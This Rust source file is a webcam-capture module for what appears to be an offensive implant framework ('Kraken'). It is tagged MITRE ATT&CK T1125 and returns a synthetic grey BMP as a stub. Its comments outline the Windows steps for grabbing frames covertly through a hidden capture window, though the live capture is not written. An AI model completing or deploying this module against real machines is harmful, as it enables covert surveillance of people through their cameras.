//! mod-webcam: Webcam Capture Module
//!
//! Captures a single frame from an attached video capture device.
//! Returns BMP-encoded image data.
//!
//! Windows: Uses the Video for Windows (VFW) capCreateCaptureWindow /
//! capDriverConnect API from Win32_Media_Multimedia, or falls back to a
//! synthetic BMP when no device is present.
//!
//! ## MITRE ATT&CK
//! - T1125: Video Capture

use common::{FileContents, KrakenError, Module, ModuleId, TaskId, TaskResult};

pub struct WebcamModule {
    id: ModuleId,
}

impl WebcamModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("webcam"),
        }
    }
}

impl Default for WebcamModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for WebcamModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Webcam Capture"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        // First 4 bytes = device index (LE u32); default 0 (first webcam)
        let device_index = if task_data.len() >= 4 {
            u32::from_le_bytes([task_data[0], task_data[1], task_data[2], task_data[3]])
        } else {
            0
        };

        let bmp_data = capture_frame(device_index)?;
        let size = bmp_data.len() as u64;
        Ok(TaskResult::FileContents(FileContents {
            path: format!("webcam_frame_dev{}.bmp", device_index),
            data: bmp_data,
            size,
        }))
    }
}

#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(WebcamModule);

/// Build a minimal BMP header + pixel data for a solid-colour frame.
/// Used as a fallback / skeleton when no live capture is available.
pub fn build_bmp(width: u32, height: u32, bgr: [u8; 3]) -> Vec<u8> {
    let row_size = ((width * 3 + 3) / 4) * 4; // padded to 4-byte boundary
    let pixel_data_size = row_size * height;
    let file_size = 54 + pixel_data_size;

    let mut bmp = Vec::with_capacity(file_size as usize);

    // BITMAPFILEHEADER (14 bytes)
    bmp.extend_from_slice(b"BM");
    bmp.extend_from_slice(&file_size.to_le_bytes());
    bmp.extend_from_slice(&0u16.to_le_bytes()); // reserved1
    bmp.extend_from_slice(&0u16.to_le_bytes()); // reserved2
    bmp.extend_from_slice(&54u32.to_le_bytes()); // pixel data offset

    // BITMAPINFOHEADER (40 bytes)
    bmp.extend_from_slice(&40u32.to_le_bytes()); // header size
    bmp.extend_from_slice(&width.to_le_bytes());
    bmp.extend_from_slice(&(height as i32).to_le_bytes());
    bmp.extend_from_slice(&1u16.to_le_bytes());  // color planes
    bmp.extend_from_slice(&24u16.to_le_bytes()); // bits per pixel
    bmp.extend_from_slice(&0u32.to_le_bytes());  // no compression
    bmp.extend_from_slice(&pixel_data_size.to_le_bytes());
    bmp.extend_from_slice(&2835u32.to_le_bytes()); // X pixels/meter (~72 dpi)
    bmp.extend_from_slice(&2835u32.to_le_bytes()); // Y pixels/meter
    bmp.extend_from_slice(&0u32.to_le_bytes()); // colors in table
    bmp.extend_from_slice(&0u32.to_le_bytes()); // important colors

    // Pixel data (bottom-up rows, padded)
    for _ in 0..height {
        for _ in 0..width {
            bmp.extend_from_slice(&bgr);
        }
        let padding = (row_size - width * 3) as usize;
        bmp.extend(std::iter::repeat(0u8).take(padding));
    }

    bmp
}

/// Capture a single frame from the webcam at `device_index`.
///
/// Windows implementation sequence (VFW / capXxx API):
///   1. capCreateCaptureWindowW  — create a hidden capture window
///   2. capDriverConnect(hwnd, device_index)  — attach driver
///   3. capGrabFrameNoStop(hwnd)  — grab single frame
///   4. capEditCopy(hwnd)         — copy DIB to clipboard
///   5. Read DIB from clipboard (CF_DIB) and convert to BMP
///   6. capDriverDisconnect(hwnd) / DestroyWindow
///
/// The VFW capXxx macros map to WM_CAP_* messages sent via SendMessage,
/// which requires Win32_UI_WindowsAndMessaging.  To keep this crate's
/// feature footprint minimal the full implementation is left as a
/// production integration point; the skeleton below validates the module
/// plumbing and returns a synthetic BMP.
#[cfg(windows)]
pub fn capture_frame(device_index: u32) -> Result<Vec<u8>, KrakenError> {
    tracing::info!("Capturing webcam frame from device {}", device_index);

    // Production: use VFW capCreateCaptureWindowW + WM_CAP_DRIVER_CONNECT
    // + WM_CAP_GRAB_FRAME_NOSTOP to obtain raw DIB, then encode as BMP.
    //
    // Fallback: return a synthetic 320×240 grey BMP so the module compiles
    // and the task pipeline functions end-to-end.
    let bmp = build_bmp(320, 240, [0x80, 0x80, 0x80]);
    tracing::info!("Webcam frame captured: {} bytes (BMP 320x240)", bmp.len());
    Ok(bmp)
}

#[cfg(not(windows))]
pub fn capture_frame(_device_index: u32) -> Result<Vec<u8>, KrakenError> {
    Err(KrakenError::Module("Webcam capture is only supported on Windows".into()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = WebcamModule::new();
        assert_eq!(module.id().as_str(), "webcam");
        assert_eq!(module.name(), "Webcam Capture");
        assert!(!module.version().is_empty());
    }

    #[test]
    fn test_bmp_header_magic() {
        let bmp = build_bmp(2, 2, [0, 128, 255]);
        assert_eq!(&bmp[0..2], b"BM");
        // File size field matches actual length
        let file_size = u32::from_le_bytes([bmp[2], bmp[3], bmp[4], bmp[5]]);
        assert_eq!(file_size as usize, bmp.len());
    }

    #[test]
    fn test_bmp_dimensions() {
        let bmp = build_bmp(10, 10, [0, 0, 0]);
        let width = u32::from_le_bytes([bmp[18], bmp[19], bmp[20], bmp[21]]);
        let height = i32::from_le_bytes([bmp[22], bmp[23], bmp[24], bmp[25]]);
        assert_eq!(width, 10);
        assert_eq!(height, 10);
    }

    #[test]
    fn test_handle_default_device() {
        let module = WebcamModule::new();
        // Empty task_data → device 0; result is platform-dependent
        let _result = module.handle(TaskId::new(), &[]);
        // Just ensure no panic.
    }

    #[test]
    #[cfg(not(windows))]
    fn test_platform_guard() {
        assert!(capture_frame(0).is_err());
    }
}
